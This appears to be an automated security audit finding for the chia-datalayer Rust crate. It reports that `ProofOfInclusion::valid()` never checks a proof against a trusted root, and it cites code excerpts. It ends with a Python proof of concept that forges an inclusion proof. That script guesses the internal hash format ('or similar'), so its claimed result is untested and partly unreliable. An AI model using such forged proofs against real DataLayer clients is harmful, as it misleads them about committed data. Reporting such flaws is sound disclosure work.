### Title
`ProofOfInclusion::valid()` Does Not Verify Against a Trusted Root Hash — Forged Inclusion Proofs Always Pass — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle implementation only checks that the proof's layers are internally self-consistent (each `combined_hash` is correctly derived from the previous hash and the sibling hash). It never accepts a trusted root hash as a parameter and never compares the computed root against any externally committed value. Because the final check `existing_hash == self.root_hash()` is tautological — `root_hash()` returns `last.combined_hash`, which is exactly what `existing_hash` equals after the loop — the method always returns `true` for any internally consistent chain of hashes, regardless of what tree root those hashes actually represent. An attacker who controls a DataLayer server can fabricate a `ProofOfInclusion` for any arbitrary `node_hash` and any arbitrary root, and `valid()` will accept it.

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← tautological
}
``` [1](#0-0) 

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← taken from the proof itself
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop, `existing_hash` equals the last `layer.combined_hash` (the loop only continues when they match). `root_hash()` also returns `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is always `true` when the loop completes without returning `false`. The method never compares against any externally trusted root.

Contrast this with the consensus-layer `validate_merkle_proof()`, which correctly takes an external `root` parameter and enforces `tree.get_root() != *root` as a hard rejection: [3](#0-2) 

The DataLayer `ProofOfInclusion` struct is fully public and constructible from Python via the `py-bindings` feature: [4](#0-3) 

The Python binding exposes `valid()` as the primary (and only) validation method: [5](#0-4) 

### Impact Explanation

A DataLayer client that calls `proof.valid()` as its sole check for key inclusion will accept any internally consistent proof, regardless of which tree root it corresponds to. An attacker operating a DataLayer server can:

1. Construct a `ProofOfInclusion` with an arbitrary `node_hash` (e.g., a key-value pair that does not exist in the real tree).
2. Build a chain of `ProofOfInclusionLayer` entries where each `combined_hash = calculate_internal_hash(prev, side, other_hash)` using attacker-chosen values.
3. Serve this proof to a client. The client calls `proof.valid()` → `true`.
4. The client accepts the forged inclusion proof, believing a key-value pair is committed in the DataLayer tree when it is not.

This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

### Likelihood Explanation

The DataLayer is designed for untrusted peer-to-peer data exchange. Any DataLayer server (not just a compromised one — any server a client connects to) can serve a forged proof. The `valid()` API name implies complete validation, making it likely that callers rely on it exclusively. The fuzz target and all tests call `proof.valid()` without checking `proof.root_hash()` against a trusted value, demonstrating the expected usage pattern: [6](#0-5) 

### Recommendation

1. Add a `valid_for_root(trusted_root: &Hash) -> bool` method that takes the externally committed root hash (e.g., from the blockchain) and compares `self.root_hash() == trusted_root` in addition to the internal consistency check.
2. Deprecate or rename the current `valid()` to `internally_consistent()` to make clear it does not verify against any committed state.
3. Update the Python binding to expose `valid_for_root()` as the primary validation interface.
4. Mirror the pattern already used in `validate_merkle_proof()` in `crates/chia-consensus/src/merkle_tree.rs`.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker wants to forge a proof that some arbitrary node_hash is "included"
fake_node_hash = bytes([0xAA] * 32)
fake_other_hash = bytes([0xBB] * 32)

# Compute a valid combined_hash for one layer (side=0 means other is on the right)
# calculate_internal_hash(existing, side, other) = sha256(existing || other) or similar
# The attacker just needs to pick values that chain correctly
def calc_hash(left, right):
    return hashlib.sha256(b'\x02' + left + right).digest()

combined = calc_hash(fake_node_hash, fake_other_hash)

layer = ProofOfInclusionLayer(
    other_hash_side=0,       # attacker-chosen
    other_hash=fake_other_hash,
    combined_hash=combined,  # attacker-computed to satisfy the loop check
)

forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True — the proof is accepted
assert forged_proof.valid() == True
# root_hash() returns the attacker-chosen combined hash, NOT the real tree root
assert forged_proof.root_hash() == combined
# A client that only checks proof.valid() accepts this forged proof
```

The forged proof passes `valid()` because the internal chain is consistent. No check is ever made against the real committed root hash stored on-chain.

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L8-29)
```rust
#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-consensus/src/merkle_tree.rs (L334-344)
```rust
pub fn validate_merkle_proof(
    proof: &[u8],
    item: &[u8; 32],
    root: &[u8; 32],
) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root {
        return Err(SetError);
    }
    Ok(tree.generate_proof(item)?.0)
}
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
